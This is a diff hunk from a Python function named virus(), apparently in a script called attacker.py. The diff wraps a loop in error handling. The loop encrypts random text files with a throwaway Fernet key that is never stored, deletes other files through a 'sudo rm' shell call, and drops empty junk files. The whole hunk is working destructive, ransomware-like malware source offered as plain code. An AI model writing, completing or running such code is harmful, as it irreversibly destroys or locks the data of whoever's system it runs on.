@@ -74,57 +74,60 @@ def virus():
 	key = Fernet.generate_key()
 
 	while True:
-		randomeNumberOfFiles = random.randint(0,len(Files_Table)) - 1
-		randomeNumberOfTextFiles = random.randint(0,len(Text_Files_Table)) - 1
-		randomeNumberOfNonTextFiles = random.randint(0,len(NonText_Files_Table)) - 1
-	
-		found = False
-
-		##################################### encrypting a file: ########################################
-		if Text_Files_Table[randomeNumberOfTextFiles] == directory+"/attacker.py" or Text_Files_Table[randomeNumberOfTextFiles] == directory+"/encryptedfiles.txt" or Text_Files_Table[randomeNumberOfTextFiles] == directory+"/deletedfiles.txt":
-			continue
-		else:
-			f3 = open("encryptedfiles.txt","r")
-			lines = f3.readlines()
-			for line in lines:
-				if Text_Files_Table[randomeNumberOfTextFiles] == line:
-					found = True
-			f3.close()
+		try:
+			randomeNumberOfFiles = random.randint(0,len(Files_Table)) - 1
+			randomeNumberOfTextFiles = random.randint(0,len(Text_Files_Table)) - 1
+			randomeNumberOfNonTextFiles = random.randint(0,len(NonText_Files_Table)) - 1
 		
-			if found == False:
+			found = False
+
+			##################################### encrypting a file: ########################################
+			if Text_Files_Table[randomeNumberOfTextFiles] == directory+"/attacker.py" or Text_Files_Table[randomeNumberOfTextFiles] == directory+"/encryptedfiles.txt" or Text_Files_Table[randomeNumberOfTextFiles] == directory+"/deletedfiles.txt":
+				continue
+			else:
+				f3 = open("encryptedfiles.txt","r")
+				lines = f3.readlines()
+				for line in lines:
+					if Text_Files_Table[randomeNumberOfTextFiles] == line:
+						found = True
+				f3.close()
+			
+				if found == False:
+					try:
+						with open(Text_Files_Table[randomeNumberOfTextFiles],"rb") as thefile:
+							contents = thefile.read()
+						contents_enctypted = Fernet(key).encrypt(contents)
+						with open(Text_Files_Table[randomeNumberOfTextFiles],"wb") as thefile:
+							thefile.write(contents_enctypted)
+						f1 = open("encryptedfiles.txt","a")
+						f1.write(str(Text_Files_Table[randomeNumberOfTextFiles]) + "\n")
+						f1.close()
+						Text_Files_Table.remove(Text_Files_Table[randomeNumberOfTextFiles])
+						time.sleep(5)
+					except:
+						time.sleep(5)
+				else:
+					time.sleep(5)
+		
+			##################################### deleting a file: #####################################
+			if NonText_Files_Table[randomeNumberOfNonTextFiles] == directory+"/attacker.py":
+				continue
+			else:
 				try:
-					with open(Text_Files_Table[randomeNumberOfTextFiles],"rb") as thefile:
-						contents = thefile.read()
-					contents_enctypted = Fernet(key).encrypt(contents)
-					with open(Text_Files_Table[randomeNumberOfTextFiles],"wb") as thefile:
-						thefile.write(contents_enctypted)
-					f1 = open("encryptedfiles.txt","a")
-					f1.write(str(Text_Files_Table[randomeNumberOfTextFiles]) + "\n")
-					f1.close()
-					Text_Files_Table.remove(Text_Files_Table[randomeNumberOfTextFiles])
+					os.system ("sudo rm " + NonText_Files_Table[randomeNumberOfNonTextFiles])
+					#os.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
+					f2 = open("deletedfiles.txt","a")
+					f2.write(str(NonText_Files_Table[randomeNumberOfNonTextFiles]) + "\n")
+					f2.close()
+					NonText_Files_Table.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
 					time.sleep(5)
 				except:
 					time.sleep(5)
-			else:
+		
+			##################################### addind a file: #####################################
+			if random.randint(1,5) == 1:
+				f = open(str(randomeNumberOfFiles), "w")
+				f.close()
 				time.sleep(5)
-	
-		##################################### deleting a file: #####################################
-		if NonText_Files_Table[randomeNumberOfNonTextFiles] == directory+"/attacker.py":
-			continue
-		else:
-			try:
-				os.system ("sudo rm " + NonText_Files_Table[randomeNumberOfNonTextFiles])
-				#os.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
-				f2 = open("deletedfiles.txt","a")
-				f2.write(str(NonText_Files_Table[randomeNumberOfNonTextFiles]) + "\n")
-				f2.close()
-				NonText_Files_Table.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
-				time.sleep(5)
-			except:
-				time.sleep(5)
-	
-		##################################### addind a file: #####################################
-		if random.randint(1,5) == 1:
-			f = open(str(randomeNumberOfFiles), "w")
-			f.close()
-			time.sleep(5)
+		except:
+			error="but we will continue"
